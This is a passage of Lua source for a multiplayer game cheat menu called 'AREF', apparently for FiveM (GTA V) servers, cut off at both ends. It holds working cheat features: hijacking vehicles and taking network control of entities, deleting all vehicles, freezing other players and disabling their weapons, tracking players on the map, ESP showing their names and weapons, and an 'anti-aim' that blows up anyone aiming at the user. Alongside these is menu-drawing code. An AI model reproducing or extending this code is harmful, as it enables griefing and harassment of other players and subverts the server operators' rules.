                self:GetFunction("ClearPedTasks")(who)
   
                self:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)
   
    
   
                while self:GetFunction("DoesEntityExist")(veh) and self:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
   
                    timeout = timeout + 100
   
                    self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
   
                    self:GetFunction("SetVehicleDoorsLocked")(veh, 7)
   
                    self:GetFunction("NetworkRequestControlOfEntity")(veh)
   
    
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["R"]) then
   
                        self.Util:DeleteEntity(who)
   
                        self:AddNotification("INFO", "Hijack cancelled.")
   
    
   
                        return false
   
                    end
   
    
   
                    Wait(100)
   
                end
   
            end
   
    
   
            self:GetFunction("ClearPedTasks")(who)
   
            self:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, false)
   
            self:GetFunction("SetVehicleEngineOn")(veh, true)
   
            self:GetFunction("NetworkRequestControlOfEntity")(veh)
   
    
   
            if not nodrive then
   
                for i = 1, 5 do
   
                    self:GetFunction("TaskVehicleDriveWander")(who, veh, 120.0, 0)
   
                end
   
            end
   
    
   
            self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, true)
   
            self:GetFunction("SetVehicleDoorsLocked")(veh, 2)
   
    
   
            return true
   
        end
   
    
   
        function AREF:ScrW()
   
            return self._ScrW
   
        end
   
    
   
        function AREF:ScrH()
   
            return self._ScrH
   
        end
   
    
   
        local print = _print or print
   
    
   
        function AREF:Print(...)
   
            local str = (...)
   
            if not self.Config.UsePrintMessages then return false end
   
            print("[" .. self.Name .. "] " .. str)
   
    
   
            return true
   
        end
   
    
   
        function AREF:GetMousePos()
   
            return self._MouseX, self._MouseY
   
        end
   
    
   
        function AREF:RequestControlOnce(entity)
   
            if self:GetFunction("NetworkHasControlOfEntity")(entity) then return true end
   
            self:GetFunction("SetNetworkIdCanMigrate")(self:GetFunction("NetworkGetNetworkIdFromEntity")(entity), true)
   
    
   
            return self:GetFunction("NetworkRequestControlOfEntity")(entity)
   
        end
   
    
   
        function AREF:RequestControlSync(veh, timeout)
   
            timeout = timeout or 2000
   
            local counter = 0
   
            self:RequestControlOnce(veh)
   
    
   
            while not self:GetFunction("NetworkHasControlOfEntity")(veh) do
   
                counter = counter + 100
   
                Wait(100)
   
                if counter >= timeout then return false end
   
            end
   
    
   
            return true
   
        end
   
    
   
        local entityEnumerator = {
   
            __gc = function(enum)
   
                if enum.destructor and enum.handle then
   
                    enum.destructor(enum.handle)
   
                end
   
    
   
                enum.destructor = nil
   
                enum.handle = nil
   
            end
   
        }
   
    
   
        function AREF:EnumerateEntities(initFunc, moveFunc, disposeFunc)
   
            return coroutine.wrap(function()
   
                local iter, id = initFunc()
   
    
   
                if not id or id == 0 then
   
                    disposeFunc(iter)
   
    
   
                    return
   
                end
   
    
   
                local enum = {
   
                    handle = iter,
   
                    destructor = disposeFunc
   
                }
   
    
   
                setmetatable(enum, entityEnumerator)
   
                local next = true
   
                repeat
   
                    coroutine.yield(id)
   
                    next, id = moveFunc(iter)
   
                until not next
   
                enum.destructor, enum.handle = nil, nil
   
                disposeFunc(iter)
   
            end)
   
        end
   
    
   
        function AREF:EnumerateVehicles()
   
            return self:EnumerateEntities(self:GetFunction("FindFirstVehicle"), self:GetFunction("FindNextVehicle"), self:GetFunction("EndFindVehicle"))
   
        end
   
    
   
        function AREF:EnumeratePeds()
   
            return self:EnumerateEntities(self:GetFunction("FindFirstPed"), self:GetFunction("FindNextPed"), self:GetFunction("EndFindPed"))
   
        end
   
    
   
        function AREF:EnumerateObjects()
   
            return self:EnumerateEntities(self:GetFunction("FindFirstObject"), self:GetFunction("FindNextObject"), self:GetFunction("EndFindObject"))
   
        end
   
    
   
        function AREF:GetClosestVehicle(max_dist)
   
            local veh, dist = nil, dict.math.huge
   
            local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)
   
    
   
            for vehicle in self:EnumerateVehicles() do
   
                local this = self:GetFunction("GetOffsetFromEntityInWorldCoords")(vehicle, 0.0, 0.0, 0.0)
   
    
   
                if self:GetFunction("DoesEntityExist")(vehicle) then
   
                    local distance = self:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
   
    
   
                    if distance < dist then
   
                        dist = distance
   
                        veh = vehicle
   
                    end
   
                end
   
            end
   
    
   
            if dist > (max_dist or 10.0) then return end
   
    
   
            return veh, dist
   
        end
   
    
   
        function AREF:GetClosestPed(max_dist)
   
            local ped, dist = nil, dict.math.huge
   
            local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)
   
    
   
            for pedestrian in self:EnumeratePeds() do
   
                local this = self:GetFunction("GetOffsetFromEntityInWorldCoords")(pedestrian, 0.0, 0.0, 0.0)
   
    
   
                if self:GetFunction("DoesEntityExist")(pedestrian) then
   
                    local distance = self:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
   
    
   
                    if distance < dist then
   
                        dist = distance
   
                        ped = pedestrian
   
                    end
   
                end
   
            end
   
    
   
            if dist > (max_dist or 10.0) then return end
   
    
   
            return ped, dist
   
        end
   
    
   
        function AREF:GetClosestPeds()
   
            local list = {}
   
    
   
            for ped in self:EnumeratePeds() do
   
                list[ped] = {
   
                    ped = ped,
   
                    dist = self:GetFunction("GetDistanceBetweenCoords")(self:GetFunction("GetEntityCoords")(self.LocalPlayer).xyz, self:GetFunction("GetEntityCoords")(ped).xyz, true)
   
                }
   
            end
   
    
   
            dict.table.sort(list, function(a, b) return a.dist < b.dist end)
   
    
   
            return dict.pairs(list)
   
        end
   
    
   
        function AREF:GetClosestObject(max_dist)
   
            local obj, dist = nil, dict.math.huge
   
            local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)
   
    
   
            for object in self:EnumeratePeds() do
   
                local this = self:GetFunction("GetOffsetFromEntityInWorldCoords")(object, 0.0, 0.0, 0.0)
   
    
   
                if self:GetFunction("DoesEntityExist")(object) then
   
                    local distance = self:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)
   
    
   
                    if distance < dist then
   
                        dist = distance
   
                        obj = object
   
                    end
   
                end
   
            end
   
    
   
            if dist > (max_dist or 10.0) then return end
   
    
   
            return obj, dist
   
        end
   
    
   
        function AREF:DeleteVehicles()
   
            local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
            CreateThread(function()
   
                for veh in self:EnumerateVehicles() do
   
                    if self:RequestControlSync(veh) and (veh ~= _veh or self.Config.OnlineIncludeSelf) then
   
                        self.Util:DeleteEntity(veh)
   
                    end
   
                end
   
            end)
   
        end
   
    
   
        function AREF:RepairVehicle(vehicle)
   
            if vehicle == 0 then return false end
   
            self:RequestControlOnce(vehicle)
   
            self:GetFunction("SetVehicleFixed")(vehicle)
   
    
   
            return true
   
        end
   
    
   
        local was_dragging
   
    
   
        function AREF:TranslateMouse(wx, wy, ww, wh, drag_id)
   
            local mx, my = self:GetMousePos()
   
    
   
            if not self.DraggingX and not self.DraggingY then
   
                self.DraggingX = mx
   
                self.DraggingY = my
   
            end
   
    
   
            local mpx = self.DraggingX - wx
   
            local mpy = self.DraggingY - wy
   
    
   
            if self.DraggingX ~= mx or self.DraggingY ~= my then
   
                self.DraggingX = mx
   
                self.DraggingY = my
   
            end
   
    
   
            local dx = wx - (self.DraggingX - mpx)
   
            local dy = wy - (self.DraggingY - mpy)
   
            was_dragging = drag_id
   
    
   
            return wx - dx, wy - dy
   
        end
   
    
   
        local scroller_y
   
    
   
        function AREF:TranslateScroller(sy, sh, by)
   
            local _, my = self:GetMousePos()
   
    
   
            if not scroller_y then
   
                scroller_y = my
   
            end
   
    
   
            local mpy = scroller_y - sy
   
    
   
            if scroller_y ~= my then
   
                scroller_y = my
   
            end
   
    
   
            return mpy
   
        end
   
    
   
        local text_cache = {}
   
    
   
        local function _text_width(str, font, scale)
   
            if not str then return 0.0 end
   
            font = font or 4
   
            scale = scale or 0.35
   
            if text_cache[font] and text_cache[font][scale] and text_cache[font][scale][str] then return text_cache[font][scale][str].length end
   
            text_cache[font] = text_cache[font] or {}
   
            text_cache[font][scale] = text_cache[font][scale] or {}
   
            AREF:GetFunction("BeginTextCommandWidth")("STRING")
   
            AREF:GetFunction("AddTextComponentSubstringPlayerName")(str)
   
            AREF:GetFunction("SetTextFont")(font or 4)
   
            AREF:GetFunction("SetTextScale")(scale or 0.35, scale or 0.35)
   
            local length = AREF:GetFunction("EndTextCommandGetWidth")(1)
   
    
   
            text_cache[font][scale][str] = {
   
                length = length
   
            }
   
    
   
            return length
   
        end
   
    
   
        function AREF.Painter:GetTextWidth(str, font, scale)
   
            return _text_width(str, font, scale) * AREF:ScrW()
   
        end
   
    
   
        function AREF.Painter:DrawText(text, font, centered, x, y, scale, r, g, b, a)
   
            AREF:GetFunction("SetTextFont")(font)
   
            AREF:GetFunction("SetTextScale")(scale, scale)
   
            AREF:GetFunction("SetTextCentre")(centered)
   
            AREF:GetFunction("SetTextColour")(r, g, b, a)
   
            AREF:GetFunction("BeginTextCommandDisplayText")("STRING")
   
            AREF:GetFunction("AddTextComponentSubstringPlayerName")(text)
   
            AREF:GetFunction("EndTextCommandDisplayText")(x / AREF:ScrW(), y / AREF:ScrH())
   
        end
   
    
   
        local listing
   
    
   
        local function _lerp(delta, from, to)
   
            if delta > 1 then return to end
   
            if delta < 0 then return from end
   
    
   
            return from + (to - from) * delta
   
        end
   
    
   
        local color_lists = {}
   
    
   
        function AREF.Painter:ListItem(label, px, py, x, y, w, h, r, g, b, a, id)
   
            if listing and not AREF:GetFunction("IsDisabledControlReleased")(0, 24) then
   
                listing = nil
   
            end
   
    
   
            if not w or w <= 0 then
   
                w = self:GetTextWidth(label, 4, size or 0.37)
   
            end
   
    
   
            if not color_lists[id] then
   
                color_lists[id] = {
   
                    r = 0,
   
                    g = 0,
   
                    b = 0
   
                }
   
            end
   
    
   
            local bool = AREF.Config.SelectedCategory == id
   
    
   
            if bool then
   
                color_lists[id].r = _lerp(0.1, color_lists[id].r, AREF.Config.Tertiary[1])
   
                color_lists[id].g = _lerp(0.1, color_lists[id].g, AREF.Config.Tertiary[2])
   
                color_lists[id].b = _lerp(0.1, color_lists[id].b, AREF.Config.Tertiary[3])
   
            else
   
                color_lists[id].r = _lerp(0.1, color_lists[id].r, 255)
   
                color_lists[id].g = _lerp(0.1, color_lists[id].g, 255)
   
                color_lists[id].b = _lerp(0.1, color_lists[id].b, 255)
   
            end
   
    
   
            self:DrawRect(px + x, py + y, w, h, r, g, b, a)
   
            self:DrawText(label, 4, true, px + w / 2, py + y - 5, 0.34, dict.math.ceil(color_lists[id].r), dict.math.ceil(color_lists[id].g), dict.math.ceil(color_lists[id].b), 255)
   
    
   
            if self:Holding(px + x, py + y, w, h, id) or AREF.Config.SelectedCategory == id then
   
                if not listing and AREF.Config.SelectedCategory ~= id then
   
                    listing = true
   
    
   
                    return true
   
                else
   
                    return false
   
                end
   
            end
   
    
   
            return false
   
        end
   
    
   
        local selector
   
        local list_choices = {}
   
    
   
        function AREF.Painter:DrawSprite(x, y, w, h, heading, dict, name, r, g, b, a, custom)
   
            if not AREF:GetFunction("HasStreamedTextureDictLoaded")(dict) and not custom then
   
                AREF:GetFunction("RequestStreamedTextureDict")(dict)
   
            end
   
    
   
            AREF:GetFunction("DrawSprite")(dict, name, x / AREF:ScrW(), y / AREF:ScrH(), w / AREF:ScrW(), h / AREF:ScrH(), heading, r, g, b, a)
   
        end
   
    
   
        local left_active, right_active
   
    
   
        function AREF.Painter:ListChoice(label, options, px, py, x, y, w, h, r, g, b, a, id, selected, unbind_caller)
   
            list_choices[id] = list_choices[id] or {
   
                selected = selected or 1,
   
                options = options
   
            }
   
    
   
            if not w or w <= 0 then
   
                w = self:GetTextWidth(label, 4, size or 0.37)
   
            end
   
    
   
            local ret
   
            local lR, lG, lB = 255, 255, 255
   
            local rR, rG, rB = 255, 255, 255
   
            self:DrawText(label, 4, false, px + x, py + y, 0.4, 255, 255, 255, 255)
   
            local width = self:GetTextWidth(label, 4, 0.4)
   
            local left_x, left_y = px + x + (width - 16.0), py + y + 13
   
    
   
            if self:Holding(left_x + 18 - 9.1, left_y - 5, 38.4, 19.2, 13.5, id .. "_left") then
   
                if not left_active or left_active == id .. "_left" then
   
                    lR, lG, lB = AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3]
   
                end
   
    
   
                if not left_active then
   
                    left_active = id .. "_left"
   
                    local cur = list_choices[id].selected
   
                    local new = cur - 1
   
    
   
                    if not list_choices[id].options[new] then
   
                        new = #list_choices[id].options
   
                    end
   
    
   
                    list_choices[id].selected = new
   
                    ret = true
   
                end
   
            elseif left_active == id .. "_left" then
   
                left_active = nil
   
            end
   
    
   
            local cur = list_choices[id].options[list_choices[id].selected]
   
    
   
            if not cur then
   
                cur = "NONE"
   
            end
   
    
   
            local cur_width = self:GetTextWidth(cur, 4, 0.4)
   
    
   
            if self:Holding(left_x + 18 + cur_width + 16.0 - 9.1, left_y - 5, 19.2, 13.5, id .. "_right") then
   
                if not right_active or right_active == id .. "_right" then
   
                    rR, rG, rB = AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3]
   
                end
   
    
   
                if not right_active then
   
                    right_active = id .. "_right"
   
                    local cur = list_choices[id].selected
   
                    local new = cur + 1
   
    
   
                    if not list_choices[id].options[new] then
   
                        new = 1
   
                    end
   
    
   
                    list_choices[id].selected = new
   
                    ret = true
   
                end
   
            elseif right_active == id .. "_right" then
   
                right_active = nil
   
            end
   
    
   
            self:DrawText(cur, 4, false, left_x + 27, left_y - 14, 0.4, 255, 255, 255, 255)
   
            self:DrawSprite(left_x + 18, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowleft", lR, lG, lB, 255)
   
            self:DrawSprite(left_x + 18 + cur_width + 16.0, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowright", rR, rG, rB, 255)
   
    
   
            if self:Hovered(px + x, py + y + 8, width + 27 + cur_width, 10) and unbind_caller and AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["MOUSE2"]) and AREF.Config[unbind_caller] ~= "NONE" then
   
                AREF.Config[unbind_caller] = "NONE"
   
                list_choices[id].selected = -1
   
                AREF.ConfigClass.Save(true)
   
                ret = false
   
            end
   
    
   
            return ret
   
        end
   
    
   
        local checked
   
        local color_checks = {}
   
    
   
        function AREF.Painter:CheckBox(label, bool, px, py, x, y, w, h, r, g, b, a, id, centered, size)
   
            if not AREF:GetFunction("IsDisabledControlPressed")(0, 24) and checked then
   
                checked = nil
   
            end
   
    
   
            if not w or w <= 0 then
   
                w = self:GetTextWidth(label, 4, size or 0.37)
   
            end
   
    
   
            if not color_checks[id] then
   
                color_checks[id] = {
   
                    r = 0,
   
                    g = 0,
   
                    b = 0,
   
                    a = 0
   
                }
   
            end
   
    
   
            self:DrawRect(px + x, py + y, 20, 20, 25, 25, 25, 200)
   
    
   
            if bool then
   
                color_checks[id].r = _lerp(0.1, color_checks[id].r, AREF.Config.Tertiary[1])
   
                color_checks[id].g = _lerp(0.1, color_checks[id].g, AREF.Config.Tertiary[2])
   
                color_checks[id].b = _lerp(0.1, color_checks[id].b, AREF.Config.Tertiary[3])
   
                color_checks[id].a = _lerp(0.1, color_checks[id].a, 200)
   
            else
   
                color_checks[id].r = _lerp(0.1, color_checks[id].r, 20)
   
                color_checks[id].g = _lerp(0.1, color_checks[id].g, 20)
   
                color_checks[id].b = _lerp(0.1, color_checks[id].b, 20)
   
                color_checks[id].a = _lerp(0.1, color_checks[id].a, 0)
   
            end
   
    
   
            self:DrawRect(px + x + 2.5, py + y + 2.5, 15, 15, dict.math.ceil(color_checks[id].r), dict.math.ceil(color_checks[id].g), dict.math.ceil(color_checks[id].b), dict.math.ceil(color_checks[id].a))
   
            self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x + 25), py + y - 4, size or 0.37, r, g, b, a)
   
    
   
            if self:Holding(px + x, py + y, w, h, id) then
   
                if not checked then
   
                    checked = id
   
    
   
                    if AREF.Config.UseSounds then
   
                        AREF:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
   
                    end
   
    
   
                    return true
   
                else
   
                    return false
   
                end
   
            end
   
    
   
            return false
   
        end
   
    
   
        local activated
   
        local buttons = {}
   
    
   
        function AREF.Painter:Button(label, px, py, x, y, w, h, r, g, b, a, id, centered, size)
   
            if not AREF:GetFunction("IsDisabledControlPressed")(0, 24) and activated then
   
                activated = nil
   
            end
   
    
   
            if not w or w <= 0 then
   
                w = self:GetTextWidth(label, 4, size or 0.37)
   
            end
   
    
   
            buttons[id] = buttons[id] or {
   
                x = px + x,
   
                y = py + y,
   
                w = w,
   
                h = h
   
            }
   
    
   
            if self:Holding(px + x, py + y, w, h, id) then
   
                self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3], AREF.Config.Tertiary[4])
   
    
   
                if not activated then
   
                    activated = id
   
    
   
                    if AREF.Config.UseSounds then
   
                        AREF:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
   
                    end
   
    
   
                    return true
   
                else
   
                    return false
   
                end
   
            end
   
    
   
            self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, r, g, b, a)
   
    
   
            return false
   
        end
   
    
   
        function AREF.Painter:DrawRect(x, y, w, h, r, g, b, a)
   
            local _w, _h = w / AREF:ScrW(), h / AREF:ScrH()
   
            local _x, _y = x / AREF:ScrW() + _w / 2, y / AREF:ScrH() + _h / 2
   
            AREF:GetFunction("DrawRect")(_x, _y, _w, _h, r, g, b, a)
   
        end
   
    
   
        function AREF.Painter:Hovered(x, y, w, h)
   
            local mx, my = AREF:GetMousePos()
   
    
   
            if mx >= x and mx <= x + w and my >= y and my <= y + h then
   
                return true
   
            else
   
                return false
   
            end
   
        end
   
    
   
        local holding
   
    
   
        function AREF.Painter:Holding(x, y, w, h, id)
   
            if AREF:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
   
            if holding == id and AREF:GetFunction("IsDisabledControlPressed")(0, 24) then return true end
   
            if holding ~= nil and AREF:GetFunction("IsDisabledControlPressed")(0, 24) then return end
   
    
   
            if self:Hovered(x, y, w, h) and AREF:GetFunction("IsDisabledControlPressed")(0, 24) then
   
                holding = id
   
    
   
                return true
   
            elseif holding == id and not self:Hovered(x, y, w, h) or not AREF:GetFunction("IsDisabledControlPressed")(0, 24) then
   
                holding = nil
   
            end
   
    
   
            return false
   
        end
   
    
   
        function AREF.Painter:HoveringID(id)
   
            local dat = buttons[id]
   
            if not dat then return false end
   
    
   
            return self:Hovered(dat.x, dat.y, dat.w, dat.h)
   
        end
   
    
   
        local clicked
   
    
   
        function AREF.Painter:Clicked(x, y, w, h)
   
            if clicked then
   
                if not AREF:GetFunction("IsDisabledControlPressed")(0, 24) then
   
                    clicked = false
   
                end
   
    
   
                return false
   
            end
   
    
   
            if self:Hovered(x, y, w, h) and AREF:GetFunction("IsDisabledControlJustReleased")(0, 24) then
   
                clicked = true
   
    
   
                return true
   
            end
   
    
   
            return false
   
        end
   
    
   
        function AREF:Clamp(what, min, max)
   
            if what < min then
   
                return min
   
            elseif what > max then
   
                return max
   
            else
   
                return what
   
            end
   
        end
   
    
   
        function AREF:LimitRenderBounds()
   
            local cx, cy = self.Config.MenuX, self.Config.MenuY
   
            cx = self:Clamp(cx, 5, self:ScrW() - self.MenuW - 5)
   
            cy = self:Clamp(cy, 42, self:ScrH() - self.MenuH - 5)
   
            local nx, ny = self.Config.NotifX, self.Config.NotifY
   
    
   
            if nx and ny and self.Config.NotifW then
   
                nx = self:Clamp(nx, 20, self:ScrW() - self.Config.NotifW - 20)
   
                ny = self:Clamp(ny, 20, self:ScrH() - dict.notifications_h - 20)
   
                self.Config.NotifX = nx
   
                self.Config.NotifY = ny
   
            end
   
    
   
            self.Config.MenuX = cx
   
            self.Config.MenuY = cy
   
        end
   
    
   
        function AREF:AddCategory(title, func)
   
            self.Categories[#self.Categories + 1] = {
   
                Title = title,
   
                Build = func
   
            }
   
        end
   
    
   
        function AREF:SetPedModel(model)
   
            if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~s~in time.") end
   
            self:GetFunction("SetPlayerModel")(self.NetworkID, model)
   
        end
   
    
   
        function AREF:GetPedVehicleSeat(ped)
   
            local vehicle = self:GetFunction("GetVehiclePedIsIn")(ped, false)
   
            local invehicle = self:GetFunction("IsPedInAnyVehicle")(ped, false)
   
    
   
            if invehicle then
   
                for i = -2, self:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
   
                    if (self:GetFunction("GetPedInVehicleSeat")(vehicle, i) == ped) then return i end
   
                end
   
            end
   
    
   
            return -2
   
        end
   
    
   
        function AREF:GetModelLength(ent)
   
            local min, max = self:GetFunction("GetModelDimensions")(self:GetFunction("GetEntityModel")(ent))
   
    
   
            return max.y - min.y
   
        end
   
    
   
        function AREF:GetModelHeight(ent)
   
            local min, max = self:GetFunction("GetModelDimensions")(self:GetFunction("GetEntityModel")(ent))
   
    
   
            return max.z - min.z
   
        end
   
    
   
        function AREF:Tracker()
   
            if not self.TrackingPlayer then return end
   
    
   
            if not self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
   
                self.TrackingPlayer = nil
   
    
   
                return
   
            end
   
    
   
            local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer, 0.0, 0.0, 0.0))
   
            self:GetFunction("SetNewWaypoint")(coords.x, coords.y)
   
        end
   
    
   
        function AREF:DoFrozen()
   
            for src, bool in dict.pairs(dict.frozen_players) do
   
                src = dict.tonumber(src)
   
                local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                if self:GetFunction("DoesEntityExist")(ped) then
   
                    if bool == true then
   
                        self:GetFunction("NetworkRequestControlOfEntity")(ped)
   
                        self:GetFunction("ClearPedTasksImmediately")(ped)
   
                        self:GetFunction("DisablePlayerFiring")(src, true)
   
                        self:GetFunction("SetPedConfigFlag")(ped, 292, true)
   
                        self:GetFunction("SetPedConfigFlag")(ped, 60, true)
   
                        self:GetFunction("SetPedConfigFlag")(ped, 122, true)
   
                    elseif bool == false then
   
                        self:GetFunction("NetworkRequestControlOfEntity")(ped)
   
                        self:GetFunction("DisablePlayerFiring")(src, false)
   
                        self:GetFunction("SetPedConfigFlag")(ped, 292, false)
   
                        self:GetFunction("SetPedConfigFlag")(ped, 60, false)
   
                        self:GetFunction("SetPedConfigFlag")(ped, 122, false)
   
                        dict.frozen_players[src] = nil
   
                    end
   
                end
   
            end
   
        end
   
    
   
        local blips = {}
   
    
   
        function AREF:DoBlips(remove)
   
            if remove or not self.Config.Player.Blips or not self.Enabled then
   
                if remove or #blips > 0 then
   
                    for src, blip in dict.pairs(blips) do
   
                        self:GetFunction("RemoveBlip")(blip)
   
                        blips[src] = nil
   
                    end
   
                end
   
    
   
                return
   
            end
   
    
   
            for src, blip in dict.pairs(blips) do
   
                if not self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(src)) then
   
                    self:GetFunction("RemoveBlip")(blip)
   
                    blips[src] = nil
   
                else
   
                    local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
   
                    local head = self:GetFunction("GetEntityHeading")(self:GetFunction("GetPlayerPed")(src))
   
                    self:GetFunction("SetBlipCoords")(blip, coords.x, coords.y, coords.z)
   
                    self:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
   
                    self:GetFunction("SetBlipCategory")(blip, 7)
   
                    self:GetFunction("SetBlipScale")(blip, 0.87)
   
                end
   
            end
   
    
   
            for id, src in dict.pairs(self.PlayerCache) do
   
                src = dict.tonumber(src)
   
    
   
                if self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(src)) and not blips[src] and src ~= AREF.NetworkID then
   
                    local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
   
                    local head = self:GetFunction("GetEntityHeading")(self:GetFunction("GetPlayerPed")(src))
   
                    local blip = self:GetFunction("AddBlipForCoord")(coords.x, coords.y, coords.z)
   
                    self:GetFunction("SetBlipSprite")(blip, 1)
   
                    self:GetFunction("ShowHeadingIndicatorOnBlip")(blip, true)
   
                    self:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
   
                    self:GetFunction("SetBlipScale")(blip, 0.87)
   
                    self:GetFunction("SetBlipCategory")(blip, 7)
   
                    self:GetFunction("BeginTextCommandSetBlipName")("STRING")
   
                    self:GetFunction("AddTextComponentSubstringPlayerName")(self:GetFunction("GetPlayerName")(src))
   
                    self:GetFunction("EndTextCommandSetBlipName")(blip)
   
                    blips[src] = blip
   
                end
   
            end
   
        end
   
    
   
        function AREF:DoAntiAim()
   
            if not self.Config.Player.AntiAim then return end
   
    
   
            for id, src in dict.pairs(self.PlayerCache) do
   
                src = dict.tonumber(src)
   
                local ped = self:GetFunction("GetPlayerPed")(src)
   
                local ret, ent = self:GetFunction("GetEntityPlayerIsFreeAimingAt")(src)
   
    
   
                if ret and ent == self.LocalPlayer then
   
                    local pos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
                    self:GetFunction("AddExplosion")(pos.x, pos.y, pos.z, 1, 0.0, false, true, 10.0)
   
                end
   
            end
   
        end
   
    
   
        function AREF:TeleportToWaypoint()
   
            local waypoint = self:GetFunction("GetFirstBlipInfoId")(8)
   
            if not DoesBlipExist(waypoint) then return self:AddNotification("ERROR", "You must have a waypoint set to use this!") end
   
            local coords = self:GetFunction("GetBlipInfoIdCoord")(waypoint)
   
    
   
            CreateThread(function()
   
                for height = 100, -100, -5 do
   
                    self:GetFunction("SetPedCoordsKeepVehicle")(self.LocalPlayer, coords.x, coords.y, height + 0.0)
   
                    local foundGround, zPos = self:GetFunction("GetGroundZFor_3dCoord")(coords.x, coords.y, height + 0.0)
   
    
   
                    if foundGround then
   
                        self:GetFunction("SetPedCoordsKeepVehicle")(self.LocalPlayer, coords.x, coords.y, zPos + 0.0)
   
                        break
   
                    end
   
    
   
                    Wait(5)
   
                end
   
    
   
                self:AddNotification("SUCCESS", "Teleported to waypoint.")
   
            end)
   
        end
   
    
   
        local esp_talk_col = AREF.Config.Tertiary
   
    
   
        function AREF:DoESP()
   
            if not self.Config.Player.ESP then return end
   
            local spot = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)
   
    
   
            if self.FreeCam and self.FreeCam.On and camX and camY and camZ then
   
                spot = vector3(camX, camY, camZ)
   
            elseif self.SpectatingPlayer and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
   
                spot = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer, 0.0, 0.0, 0.0))
   
            elseif self.RCCar.On and self.RCCar.CamOn and rc_camX and rc_camY and rc_camZ then
   
                spot = vector3(rc_camX, rc_camY, rc_camZ)
   
            end
   
    
   
            for id, src in dict.pairs(self.PlayerCache) do
   
                src = dict.tonumber(src)
   
                local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                if self:GetFunction("DoesEntityExist")(ped) and ped ~= self.LocalPlayer then
   
                    local _id = dict.tonumber(self:GetFunction("GetPlayerServerId")(src))
   
                    local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, dict.vector_origin.x, dict.vector_origin.y, dict.vector_origin.z)
   
                    local dist = self:GetFunction("GetDistanceBetweenCoords")(spot.x, spot.y, spot.z, coords.x, coords.y, coords.z)
   
                    local seat = dict.tonumber(self:GetPedVehicleSeat(ped))
   
    
   
                    if seat ~= -2 then
   
                        seat = seat + 0.25
   
                    end
   
    
   
                    if dist <= self.Config.Player.ESPDistance then
   
                        local pos_z = coords.z + 1.2
   
    
   
                        if seat ~= -2 then
   
                            pos_z = pos_z + seat
   
                        end
   
    
   
                        local _on_screen, _, _ = self:GetFunction("GetScreenCoordFromWorldCoord")(coords.x, coords.y, pos_z)
   
    
   
                        if _on_screen and self.Config.Player.Box then
   
                            self:DoBoxESP(src, ped)
   
                        end
   
    
   
                        if _on_screen and self.Config.Player.Names then
   
                            local add = ""
   
    
   
                            if self.Config.Player.NameWeapons then
   
                                local wep = self:GetFunction("GetSelectedPedWeapon")(ped)
   
                                local name = all_weapons_hashes[wep] or "UNKNOWN"
   
                                add = " (Weapon: " .. name .. ")"
   
                            end
   
    
   
                            local col = dict.color_white
   
    
   
                            if self:GetFunction("IsPedDeadOrDying")(ped) then
   
                                col = dict.color_dead
   
                            end
   
    
   
                            if self:GetFunction("NetworkIsPlayerTalking")(src) then
   
